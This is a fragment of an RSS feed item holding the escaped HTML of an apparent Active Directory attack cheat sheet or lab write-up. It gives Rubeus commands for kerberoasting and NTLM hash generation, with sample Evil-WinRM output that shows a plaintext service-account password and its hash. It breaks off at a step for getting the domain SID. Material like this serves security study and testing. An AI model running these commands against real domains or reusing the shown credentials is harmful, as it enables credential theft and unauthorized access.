class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;b&amp;#39;2186a912c7f240246fd2c2b04651f9b4\r\n&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&#xA;&#xA;&lt;div class=&#34;tabcontent&#34; data-tabset=&#34;set1&#34; data-tabcontent=&#34;tab2&#34;&gt;&lt;h4 id=&#34;1-get-service-principle-name-spn-optional&#34;&gt;1. Get Service Principle Name (SPN) [Optional]&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;.\rubeus.exe kerberoast /domain:&amp;lt;DOMAIN&amp;gt; /dc:&amp;lt;DC&amp;gt; /creduser:&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt; /credpassword:&amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; /nowrap&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;2-generate-ntlm&#34;&gt;2. Generate NTLM&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;.\rubeus.exe hash /password:&amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;*Evil-WinRM* PS C:\Users\sql_svc\Documents&amp;gt; .\rubeus.exe hash /password:&amp;#39;REGGIE1234ronnie&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;   ______        _&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;  (_____ \      | |&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;   _____) )_   _| |__  _____ _   _  ___&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;  |  __  /| | | |  _ \| ___ | | | |/___)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;  | |  \ \| |_| | |_) ) ____| |_| |___ |&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;  |_|   |_|____/|____/|_____)____/(___/&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;  v2.2.0&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[*] Action: Calculate Password Hash(es)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[*] Input password             : REGGIE1234ronnie&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*]       rc4_hmac             : 1443EC19DA4DAC4FFC953BCA1B57B4CF&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[!] /user:X and /domain:Y need to be supplied to calculate AES and DES hash types!&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;3a-get-domain-sid-local&#34;&gt;3a. Get Domain SID [Local]&lt;/h4&gt;&#xA;&lt;p&gt;&lt;button data-tabset=&#34;set1-2&#34; data-tabcontent=&#34;tab1&#34; class=&#34;active&#34;&gt;Powershell&lt;/button&gt;&#xA;&lt;button data-tabset=&#34;set1-2&#34; data-tabcontent=&#34;tab2&#34; &gt;cmd&lt;/button&gt;&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
